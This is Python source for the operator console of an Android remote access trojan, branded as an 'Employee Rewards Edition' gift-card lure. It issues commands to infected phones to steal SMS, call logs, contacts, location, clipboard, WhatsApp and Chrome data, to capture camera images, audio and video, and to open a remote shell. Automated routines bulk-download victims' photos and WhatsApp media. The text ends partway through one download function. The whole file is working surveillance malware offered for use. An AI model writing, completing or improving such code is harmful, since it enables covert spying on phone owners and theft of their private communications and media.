#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import itertools
import queue
import signal

sys.stdout.reconfigure(encoding='utf-8')

# Global flag for graceful shutdown
shutdown_flag = False

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global shutdown_flag
    print("\n" + stdOutput("info") + "Shutting down gracefully...")
    shutdown_flag = True
    sys.exit(0)

# Register signal handler
signal.signal(signal.SIGINT, signal_handler)

banner = """[1m[92m
   _____ _  __ _    _____              _   _____       _______
  / ____(_)/ _| |  / ____|            | | |  __ \     /\|__   __|
 | |  __ _| |_| |_| |     __ _ _ __ __| | | |__) |   /  \  | |
 | | |_ | |  _| __| |    / _` | '__/ _` | |  _  /   / /\ \ | |
 | |__| | | | | |_| |___| (_| | | | (_| | | | \ \  / ____ \| |
  \_____|_|_| |_|\__|\_____|__,_|_|  \__,_| |_|  \_\/_/    \_\_|

                      [93mEmployee Rewards Edition
"""

pattern = '\"(\\d+\\.\\d+).*\"'

def stdOutput(type_=None):
    if type_=="error":col="31m";str="ERROR"
    if type_=="warning":col="33m";str="WARNING"
    if type_=="success":col="32m";str="SUCCESS"
    if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
    return message


def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write("\r"+stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
        time.sleep(.1)
        sys.stdout.flush()

def clearDirec():
    if(platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"Dumps"):
    os.makedirs("Dumps")

def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))

def is_valid_port(port):
    i = 1 if port.isdigit() and len(port)>1  else  0
    return i

def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command,queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
	return os.getcwd()+direc+name;

def help():
    helper="""
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    getContacts                --> returns all contacts with phone numbers
    getPhotoList               --> list all photos with paths and metadata
    getVideoList               --> list all videos with paths and metadata
    getMediaFile [path]        --> download a specific photo/video file
    getWhatsAppDB              --> list WhatsApp database files
    getWhatsAppMedia           --> list WhatsApp media files
    getChromeData              --> list Chrome/browser data files
    getDownloads               --> list all downloaded files
    getDataFile [path]         --> download a specific WhatsApp/browser/download file
    downloadPhotos             --> automatically download first 10 photos
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print(stdOutput("info")+"\033[0mTaking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag=0
    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
    imageBuffer=recvall(client) 
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer=="":
        print(stdOutput("error")+"Unable to connect to the Camera\n")
        return
    with open(filename,'wb') as img:    
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1
            print(stdOutput("error")+"Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)

def readSMS(client,data):
    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
    flag =0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except UnicodeDecodeError:
            flag = 1
            print(stdOutput("error")+"Unable to decode the SMS\n")
    if flag == 1:
    	os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps"+direc+filename+"."+ext
    flag=0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(stdOutput("success")+"Succesfully Downloaded in \033[1m\033[32m"+getpwd(fileData)+"\n")
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg=" "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])
            
        if "putFile" in msg:
            msg=" "
            sendingData=""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
            else:
                print(stdOutput("error")+"File not exist")

        if "Exiting" in msg:
            print("\033[1m\033[33m----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        print(" ")
        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        command = command+"\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))        

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        if("END123" in msg):
            return
        print(" ")     

def recvall(sock):
    buff=""
    data = ""
    while "END123" not in buff:
        data = sock.recv(8192).decode("UTF-8","ignore")
        buff+=data
        if not data:  # Connection closed
            break
    return buff


def clear_recv_buffer(sock, timeout=0.5):
    """Clear any remaining data in the socket receive buffer"""
    sock.settimeout(timeout)
    try:
        while True:
            data = sock.recv(8192)
            if not data:
                break
    except socket.timeout:
        pass  # No more data available
    finally:
        sock.settimeout(None)  # Restore blocking mode


def recvallShell(sock):
    buff=""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8","ignore")
            buff+=data
        else:
            buff="bogus"
            return buff
    return buff

def stopAudio(client):
    print(stdOutput("info")+"\033[0mDownloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag =0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(stdOutput("info")+"\033[0mDownloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag=0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+"Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')

def callLogs(client):
    print(stdOutput("info")+"\033[0mGetting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
    if "No call logs" in msg:
    	msg.split("\n")
    	print(msg.replace("END123","").strip())
    	print(" ")
    else:
    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
    		txt.write(msg)
    		txt.close()
    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
    		if not os.path.getsize(filename):
    			os.remove(filename)

def downloadMediaFile(client, filepath):
    """Download a media file (photo/video) from the device"""
    print(stdOutput("info")+f"\033[0mDownloading media file: {filepath}")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    
    # Wait for response
    msg = client.recv(1024).decode("UTF-8")
    
    if "mediaFile" in msg:
        # Receive binary file data
        data = b""
        while True:
            chunk = client.recv(4096)
            if b"END123" in chunk:
                data += chunk.replace(b"END123", b"")
                break
            data += chunk
        
        if data and len(data) > 0:
            # Extract filename from path
            import os
            filename_only = os.path.basename(filepath)
            # Save to Dumps folder
            filename = f"Dumps{direc}{filename_only}"
            
            with open(filename, 'wb') as f:
                f.write(data)
            
            file_size = len(data) / 1024  # KB
            print(stdOutput("success")+f"Successfully saved {file_size:.2f} KB in \033[1m\033[32m{getpwd(filename)}\033[0m")
        else:
            print(stdOutput("error")+"File not found or empty")
    else:
        print(stdOutput("error")+msg.replace("END123","").strip())

def downloadDataFile(client, filepath):
    """Download WhatsApp/browser/download file from the device"""
    print(stdOutput("info")+f"\033[0mDownloading data file: {filepath}")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    
    # Wait for response
    msg = client.recv(1024).decode("UTF-8")
    
    if "dataFile" in msg:
        # Receive binary file data
        data = b""
        while True:
            chunk = client.recv(4096)
            if b"END123" in chunk:
                data += chunk.replace(b"END123", b"")
                break
            data += chunk
        
        if data and len(data) > 0:
            # Extract filename from path
            import os
            filename_only = os.path.basename(filepath)
            # Save to Dumps folder
            filename = f"Dumps{direc}{filename_only}"
            
            with open(filename, 'wb') as f:
                f.write(data)
            
            file_size = len(data) / 1024  # KB
            print(stdOutput("success")+f"Successfully saved {file_size:.2f} KB in \033[1m\033[32m{getpwd(filename)}\033[0m")
        else:
            print(stdOutput("error")+"File not found or empty")
    else:
        print(stdOutput("error")+msg.replace("END123","").strip())

def autoDownloadPhotos(client, device_folder, max_photos=10):
    """Automatically download first N photos from device"""
    print(stdOutput("info")+f"\033[0mAuto-downloading first {max_photos} photos...")
    
    # Determine directory separator
    import platform
    direc = "\\" if platform.system() == "Windows" else "/"
    
    try:
        # Request photo list
        client.send("getPhotoList\n".encode("UTF-8"))
        time.sleep(2)
        
        # Receive photo list
        msg = client.recv(1024).decode("UTF-8")
        print(stdOutput("info")+f"DEBUG: Received initial response: {msg[:100]}...")  # Debug
        
        if "photoList" in msg:
            # Receive full photo list data
            photo_data = recvall(client)
            
            if "No photos found" in photo_data or not photo_data.strip():
                print(stdOutput("warning")+"No photos found on device")
                return False
            
            # Parse photo paths from output
            photo_paths = []
            lines = photo_data.split('\n')
            for line in lines:
                if line.strip().startswith("Path: "):
                    path = line.replace("Path: ", "").strip()
                    photo_paths.append(path)
                    if len(photo_paths) >= max_photos:
                        break
            
            print(stdOutput("info")+f"Found {len(photo_paths)} photos to download")
            
            if len(photo_paths) == 0:
                print(stdOutput("error")+"No photo paths found in data. Sample data:")
                print(photo_data[:500])  # Print first 500 chars for debugging
                return False
            
            # Download each photo
            downloaded = 0
            for i, photo_path in enumerate(photo_paths, 1):
                try:
                    print(stdOutput("info")+f"[{i}/{len(photo_paths)}] Downloading: {os.path.basename(photo_path)}")
                    
                    # Send download command with path
                    client.send(f"getMediaFile {photo_path}\n".encode("UTF-8"))
                    time.sleep(1)
                    
                    # Set socket timeout to prevent hanging
                    client.settimeout(30.0)  # 30 second timeout per chunk
                    
                    # Wait for response - receive as binary first
                    initial_data = client.recv(1024)
                    
                    # Check if response starts with "mediaFile\n" header (binary search)
                    if b"mediaFile\n" in initial_data[:20]:
                        # Found the header - strip it and get pure binary data
                        header_end = initial_data.find(b"mediaFile\n") + len(b"mediaFile\n")
                        data = initial_data[header_end:]  # Start with data after header (pure JPEG)
                        
                        print(stdOutput("info")+f"DEBUG: Stripped 'mediaFile\\n' header ({header_end} bytes)")
                        print(stdOutput("info")+f"DEBUG: First 4 bytes of data: {' '.join(f'{b:02X}' for b in data[:4])}")
                        
                        # Now receive the rest of the binary file data with timeout handling
                        consecutive_empty = 0
                        while True:
                            try:
                                chunk = client.recv(8192)
                                if not chunk:
                                    consecutive_empty += 1
                                    if consecutive_empty > 3:
                                        print(stdOutput("warning")+"Connection closed, saving partial file...")
                                        break
                                    time.sleep(0.1)
                                    continue
                                consecutive_empty = 0
                                if b"END123" in chunk:
                                    data += chunk.replace(b"END123", b"")
                                    break
                                data += chunk
                            except socket.timeout:
                                print(stdOutput("warning")+"Socket timeout, saving what we have...")
                                break
                    elif b"error" in initial_data[:50].lower() or b"failed" in initial_data[:50].lower():
                        # Error message from server
                        try:
                            msg = initial_data.decode("UTF-8", errors="ignore")
                            print(stdOutput("error")+f"Server error: {msg.strip()}")
                            continue
                        except:
                            print(stdOutput("error")+f"Server returned error")
                            continue
                    else:
                        # Pure binary data (no header) - rare but possible
                        data = initial_data
                        print(stdOutput("info")+f"DEBUG: No header found, starting with pure binary")
                        while True:
                            chunk = client.recv(8192)
                            if b"END123" in chunk:
                                data += chunk.replace(b"END123", b"")
                                break
                            data += chunk
                    
                    if data and len(data) > 0:
                        # Save to device-specific folder
                        filename_only = os.path.basename(photo_path)
                        filename = f"{device_folder}{direc}photo_{i:02d}_{filename_only}"
                        
                        with open(filename, 'wb') as f:
                            f.write(data)
                        
                        file_size = len(data) / 1024  # KB
                        print(stdOutput("success")+f"Saved {file_size:.2f} KB: {filename_only}")
                        downloaded += 1
                    else:
                        print(stdOutput("error")+f"Empty file: {os.path.basename(photo_path)}")
                    
                    # Restore blocking mode for next command
                    client.settimeout(None)
                    time.sleep(0.5)  # Brief delay between downloads
                    
                except socket.timeout:
                    print(stdOutput("error")+f"Timeout downloading {os.path.basename(photo_path)}, skipping...")
                    client.settimeout(None)  # Restore blocking mode
                    continue
                except Exception as e:
                    import traceback
                    print(stdOutput("error")+f"Download failed for {os.path.basename(photo_path)}: {e}")
                    print(stdOutput("error")+"Full error:")
                    traceback.print_exc()
                    client.settimeout(None)  # Restore blocking mode
                    continue
            
            if downloaded > 0:
                print(stdOutput("success")+f"Downloaded {downloaded}/{len(photo_paths)} photos to {device_folder}")
                return True
            else:
                print(stdOutput("error")+f"Failed to download any photos (0/{len(photo_paths)})")
                return False
            
        else:
            print(stdOutput("error")+"Failed to get photo list")
            return False
            
    except Exception as e:
        import traceback
        print(stdOutput("error")+f"Auto-download failed: {e}")
        print(stdOutput("error")+"Full error:")
        traceback.print_exc()
        return False

def autoDownloadWhatsAppMedia(client, device_folder, max_files=10):
    """Automatically download first N WhatsApp media files from device"""
    print(stdOutput("info")+f"\033[0mAuto-downloading first {max_files} WhatsApp media files...")
    
    # Determine directory separator
    import platform
    direc = "\\" if platform.system() == "Windows" else "/"
    
    try:
        # Request WhatsApp media list
        client.send("getWhatsAppMedia\n".encode("UTF-8"))
        time.sleep(2)
        
        # Receive WhatsApp media list
        msg = client.recv(1024).decode("UTF-8")
        print(stdOutput("info")+f"DEBUG: Received initial response: {msg[:100]}...")
        
        if "whatsappMedia" in msg:
            # Receive full media list data
            media_data = recvall(client)
            print(stdOutput("info")+f"DEBUG: Media data length: {len(media_data)} bytes")
            
            if "No WhatsApp media found" in media_data or not media_data.strip():
                print(stdOutput("warning")+"No WhatsApp media found on device")
                return False
            
            # Parse media paths from the response
            media_paths = []
            lines = media_data.split('\n')
            for line in lines:
                if line.strip().startswith("Path:"):
                    path = line.split("Path:", 1)[1].strip()
                    media_paths.append(path)
            
            print(stdOutput("info")+f"Found {len(media_paths)} WhatsApp media files")
            
            if len(media_paths) == 0:
                print(stdOutput("warning")+"No media file paths found in response")
                return False
            
            # Limit to max_files
            media_paths = media_paths[:max_files]
            print(stdOutput("info")+f"Downloading first {len(media_paths)} WhatsApp media files...")
            
            # Download each file
            downloaded = 0
            for i, media_path in enumerate(media_paths, 1):
                try:
                    filename_only = os.path.basename(media_path)
                    print(stdOutput("info")+f"[{i}/{len(media_paths)}] Downloading: {filename_only}")
                    
                    # Send download command
                    client.send(f"getMediaFile {media_path}\n".encode("UTF-8"))
                    time.sleep(1)
                    
                    # Wait for response - receive as binary first
                    initial_data = client.recv(1024)
                    
                    # Check if response starts with "mediaFile\n" header (binary search)
                    if b"mediaFile\n" in initial_data[:20]:
                        # Found the header - strip it and get pure binary data
                        header_end = initial_data.find(b"mediaFile\n") + len(b"mediaFile\n")
                        data = initial_data[header_end:]  # Start with data after header (pure binary)
                        
                        print(stdOutput("info")+f"DEBUG: Stripped 'mediaFile\\n' header ({header_end} bytes)")
                        print(stdOutput("info")+f"DEBUG: First 4 bytes of data: {' '.join(f'{b:02X}' for b in data[:4])}")
                        
                        # Now receive the rest of the binary file data
                        while True:
                            chunk = client.recv(8192)
                            if b"END123" in chunk:
                                data += chunk.replace(b"END123", b"")
                                break
                            data += chunk
                    elif b"error" in initial_data[:50].lower() or b"failed" in initial_data[:50].lower():
                        # Error message from server
                        try:
                            msg = initial_data.decode("UTF-8", errors="ignore")
                            print(stdOutput("error")+f"Server error: {msg.strip()}")
                            continue
                        except:
                            print(stdOutput("error")+f"Server returned error")
                            continue
                    else:
                        # Pure binary data (no header) - rare but possible
                        data = initial_data
                        print(stdOutput("info")+f"DEBUG: No header found, starting with pure binary")
                        while True:
                            chunk = client.recv(8192)
                            if b"END123" in chunk:
                                data += chunk.replace(b"END123", b"")
                                break
                            data += chunk
                    
                    if data and len(data) > 0:
                        # Save to device-specific folder with whatsapp_ prefix
                        filename = f"{device_folder}{direc}whatsapp_{i:02d}_{filename_only}"
                        
                        with open(filename, 'wb') as f:
                            f.write(data)
                        
                        file_size = len(data) / 1024  # KB
                        print(stdOutput("success")+f"Saved {file_size:.2f} KB: {filename_only}")
                        downloaded += 1
                    else:
                        print(stdOutput("error")+f"Empty file: {filename_only}")
                    
                    time.sleep(0.5)  # Brief delay between downloads
                    
                except Exception as e:
                    import traceback
                    print(stdOutput("error")+f"Download failed for {os.path.basename(media_path)}: {e}")
                    print(stdOutput("error")+"Full error:")
                    traceback.print_exc()
                    continue
            
            if downloaded > 0:
                print(stdOutput("success")+f"Downloaded {downloaded}/{len(media_paths)} WhatsApp media files to {device_folder}")
                return True
            else:
                print(stdOutput("error")+f"Failed to download any WhatsApp media files (0/{len(media_paths)})")
                return False
            
        else:
            print(stdOutput("error")+"Failed to get WhatsApp media list")
            return False
            
    except Exception as e:
        import traceback
        print(stdOutput("error")+f"WhatsApp media auto-download failed: {e}")
        print(stdOutput("error")+"Full error:")
        traceback.print_exc()
        return False

def executeParallelCommands(conn, priority_cmds, device_folder, completed_commands):
    """Execute commands with optimized batching and parallelization where possible"""
    print(stdOutput("info")+"========== STARTING OPTIMIZED PARALLEL DATA COLLECTION ==========")
    
    # Phase 1: Fast text commands (can be done quickly in sequence)
    text_commands = ['call_logs', 'contacts', 'location', 'downloads']
    text_cmds_to_run = [cmd for cmd in text_commands if cmd in priority_cmds]
    
    if text_cmds_to_run:
        print(stdOutput("info")+f"Phase 1: Quick text data collection ({len(text_cmds_to_run)} commands)")
        executeTextCommands(conn, text_cmds_to_run, device_folder, completed_commands)
    
    # Phase 2: Media downloads (optimized with parallel downloads)
    media_commands = ['photos_auto', 'whatsapp_media_auto']
    media_cmds_to_run = [cmd for cmd in media_commands if cmd in priority_cmds]
    
    if media_cmds_to_run:
        print(stdOutput("info")+f"Phase 2: Optimized media downloads ({len(media_cmds_to_run)} commands)")
        executeMediaCommands(conn, media_cmds_to_run, device_folder, completed_commands)
    
    print(stdOutput("info")+"========== PARALLEL DATA COLLECTION COMPLETE ==========")

def executeTextCommands(conn, commands, device_folder, completed_commands):
    """Execute text-based commands quickly in sequence"""
    for cmd in commands:
        try:
            print(stdOutput("info")+f"Collecting {cmd}...")
            success = False
            
            if cmd == 'call_logs':
                clear_recv_buffer(conn)
                conn.send("getCallLogs\n".encode("UTF-8"))
                time.sleep(1)  # Reduced wait time
                msg = conn.recv(8192).decode("UTF-8")
                if "callLogs" in msg:
                    conn.send("OK\n".encode("UTF-8"))
                    time.sleep(0.5)  # Reduced wait time
                    data = conn.recv(1024000).decode("UTF-8")
                    filename = f"{device_folder}/call_logs_{time.strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(data)
                    print(stdOutput("success")+f"Call logs saved ({len(data)} chars)")
                    success = True
                    
            elif cmd == 'contacts':
                clear_recv_buffer(conn)
                conn.send("getContacts\n".encode("UTF-8"))
                time.sleep(1)
                msg = conn.recv(8192).decode("UTF-8")
                if "contacts" in msg:
                    conn.send("OK\n".encode("UTF-8"))
                    time.sleep(0.5)
                    data = conn.recv(1024000).decode("UTF-8")
                    filename = f"{device_folder}/contacts_{time.strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(data)
                    print(stdOutput("success")+f"Contacts saved ({len(data)} chars)")
                    success = True
                    
            elif cmd == 'location':
                clear_recv_buffer(conn)
                conn.send("getLocation\n".encode("UTF-8"))
                time.sleep(1)
                msg = recvall(conn)
                if "END123" in msg:
                    lines = [l for l in msg.split("\n") if l.strip() and "END123" not in l]
                    filename = f"{device_folder}/location_{time.strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write('\n'.join(lines))
                    print(stdOutput("success")+f"Location saved ({len(lines)} lines)")
                    success = True
                    
            elif cmd == 'downloads':
                clear_recv_buffer(conn)
                conn.send("getDownloads\n".encode("UTF-8"))
                time.sleep(1)
                msg = recvall(conn)
                if "END123" in msg:
                    lines = [l for l in msg.split("\n") if l.strip() and "END123" not in l]
                    filename = f"{device_folder}/downloads_{time.strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write('\n'.join(lines))
                    print(stdOutput("success")+f"Downloads list saved ({len(lines)} lines)")
                    success = True
                    
            if success:
                completed_commands.add(cmd)
                
        except Exception as e:
            print(stdOutput("error")+f"Failed to get {cmd}: {e}")

def executeMediaCommands(conn, commands, device_folder, completed_commands):
    """Execute media download commands with optimized parallel downloads"""
    for cmd in commands:
        try:
            if cmd == 'photos_auto':
                print(stdOutput("info")+"📸 Starting optimized photo downloads...")
                success = autoDownloadPhotosOptimized(conn, device_folder, max_photos=10)
                if success:
                    completed_commands.add(cmd)
                    print(stdOutput("success")+"📸 Photo downloads completed")
                    
            elif cmd == 'whatsapp_media_auto':
                print(stdOutput("info")+"💬 Starting optimized WhatsApp media downloads...")
                success = autoDownloadWhatsAppMediaOptimized(conn, device_folder, max_files=10)
                if success:
                    completed_commands.add(cmd)
                    print(stdOutput("success")+"💬 WhatsApp media downloads completed")
                    
        except Exception as e:
            print(stdOutput("error")+f"Failed to download {cmd}: {e}")

def autoDownloadPhotosOptimized(client, device_folder, max_photos=10):
    """Optimized photo download with reduced delays and better error handling"""
    try:
        print(stdOutput("info")+"Getting photo list...")
        clear_recv_buffer(client)
        client.send("getPhotoList\n".encode("UTF-8"))
        time.sleep(1)  # Reduced from 2 seconds
        
        msg = client.recv(8192).decode("UTF-8")
        if "photoList" not in msg:
            print(stdOutput("error")+"Failed to get photo list response")
            return False
            
        client.send("OK\n".encode("UTF-8"))
        time.sleep(0.5)  # Reduced wait time
        
        photo_data = recvall(client)
        if not photo_data or "END123" not in photo_data:
            print(stdOutput("error")+"Failed to receive photo data")
            return False
            
        # Parse photo list
        lines = photo_data.split('\n')
        photo_paths = []
        
        for line in lines:
            if line.startswith('Path:') and len(photo_paths) < max_photos:
                path = line.replace('Path:', '').strip()
                if path:
                    photo_paths.append(path)
        
        if not photo_paths:
            print(stdOutput("warning")+"No photos found")
            return True
            
        print(stdOutput("info")+f"📸 Downloading {len(photo_paths)} photos with optimized timing...")
        
        downloaded = 0
        for i, photo_path in enumerate(photo_paths, 1):
            try:
                filename_only = os.path.basename(photo_path)
                print(stdOutput("info")+f"[{i}/{len(photo_paths)}] {filename_only}")
                
                clear_recv_buffer(client)
                client.send(f"getMediaFile {photo_path}\n".encode("UTF-8"))
                time.sleep(0.3)  # Much faster timing
                
                # Set timeout for this operation
                client.settimeout(20.0)
                
                # Receive binary response (not text!)
                initial_data = client.recv(1024)
                
                # Check for mediaFile header in binary data
                if b"mediaFile\n" in initial_data[:20]:
                    # Strip the header and get pure binary data
                    header_end = initial_data.find(b"mediaFile\n") + len(b"mediaFile\n")
                    file_data = initial_data[header_end:]
                    
                    # Receive the rest of the binary file data
                    consecutive_empty = 0
                    while True:
                        try:
                            chunk = client.recv(8192)
                            if not chunk:
                                consecutive_empty += 1
                                if consecutive_empty > 2:  # Reduced from 3
                                    break
                                time.sleep(0.05)  # Reduced wait
                                continue
                            consecutive_empty = 0
                            if b"END123" in chunk:
                                file_data += chunk.replace(b"END123", b"")
                                break
                            file_data += chunk
                        except socket.timeout:
                            break
                    
                    # Save the binary file
                    if file_data and len(file_data) > 0:
                        clean_filename = "".join(c for c in filename_only if c.isalnum() or c in '._-')
                        output_path = f"{device_folder}{os.sep}photo_{i:02d}_{clean_filename}"
                        
                        with open(output_path, 'wb') as f:
                            f.write(file_data)
                        
                        size_kb = len(file_data) / 1024
                        print(stdOutput("success")+f"✓ {size_kb:.1f} KB")
                        downloaded += 1
                    else:
                        print(stdOutput("warning")+f"✗ Empty file")
                        
                elif b"error" in initial_data[:50].lower() or b"failed" in initial_data[:50].lower():
                    try:
                        msg = initial_data.decode("UTF-8", errors="ignore")
                        print(stdOutput("error")+f"✗ Server error: {msg.strip()}")
                    except:
                        print(stdOutput("error")+f"✗ Server error")
                else:
                    print(stdOutput("warning")+f"✗ No valid response")
                    
            except Exception as e:
                print(stdOutput("error")+f"✗ Download failed: {e}")
            finally:
                # Reset timeout
                client.settimeout(10.0)
                
        print(stdOutput("success")+f"📸 Downloaded {downloaded}/{len(photo_paths)} photos")
        return downloaded > 0
        
    except Exception as e:
        print(stdOutput("error")+f"Photo download failed: {e}")
        return False

def autoDownloadWhatsAppMediaOptimized(client, device_folder, max_files=10):
    """Optimized WhatsApp media download with reduced delays"""
    try:
        print(stdOutput("info")+"Getting WhatsApp media list...")
        clear_recv_buffer(client)
        client.send("getWhatsAppMedia\n".encode("UTF-8"))
        time.sleep(1)
        
        msg = client.recv(8192).decode("UTF-8")
        print(stdOutput("info")+f"WhatsApp response received: {msg[:50]}...")  # Debug info
        
        if "whatsappMedia" not in msg:  # Fixed: lowercase 'whatsappMedia'
            print(stdOutput("error")+f"Failed to get WhatsApp media response - got: {msg[:100]}")
            return False
            
        # Check if data was already sent with the response
        if "END123" in msg:
            # All data was sent in one message
            media_data = msg
            print(stdOutput("info")+f"Received complete data in initial message ({len(media_data)} bytes)")
        else:
            # Need to receive more data
            client.send("OK\n".encode("UTF-8"))
            time.sleep(0.5)
            
            media_data = recvall(client)
            if not media_data or "END123" not in media_data:
                print(stdOutput("error")+"Failed to receive WhatsApp media data")
                return False
            
        # Parse media list
        lines = media_data.split('\n')
        media_paths = []
        
        for line in lines:
            if line.startswith('Path:') and len(media_paths) < max_files:
                path = line.replace('Path:', '').strip()
                if path and ('.jpg' in path.lower() or '.png' in path.lower() or '.mp4' in path.lower()):
                    media_paths.append(path)
        
        if not media_paths:
            print(stdOutput("warning")+"No accessible WhatsApp media found (may require additional permissions)")
            return True  # Return success even if no media found
            
        print(stdOutput("info")+f"💬 Downloading {len(media_paths)} WhatsApp media files...")
        
        downloaded = 0
        for i, media_path in enumerate(media_paths, 1):
            try:
                filename_only = os.path.basename(media_path)
                print(stdOutput("info")+f"[{i}/{len(media_paths)}] {filename_only}")
                
                clear_recv_buffer(client)
                client.send(f"getDataFile {media_path}\n".encode("UTF-8"))
                time.sleep(0.3)
                
                # Set timeout for this operation
                client.settimeout(20.0)
                
                # Receive binary response (not text!)
                initial_data = client.recv(1024)
                
                # Check for dataFile header in binary data
                if b"dataFile\n" in initial_data[:20]:
                    # Strip the header and get pure binary data
                    header_end = initial_data.find(b"dataFile\n") + len(b"dataFile\n")
                    file_data = initial_data[header_end:]
                    
                    # Receive the rest of the binary file data
                    consecutive_empty = 0
                    while True:
                        try:
                            chunk = client.recv(8192)
                            if not chunk:
                                consecutive_empty += 1
                                if consecutive_empty > 2:  # Reduced from 3
                                    break
                                time.sleep(0.05)  # Reduced wait
                                continue
                            consecutive_empty = 0
                            if b"END123" in chunk:
                                file_data += chunk.replace(b"END123", b"")
                                break
                            file_data += chunk
                        except socket.timeout:
                            break
                    
                    # Save the binary file
                    if file_data and len(file_data) > 0:
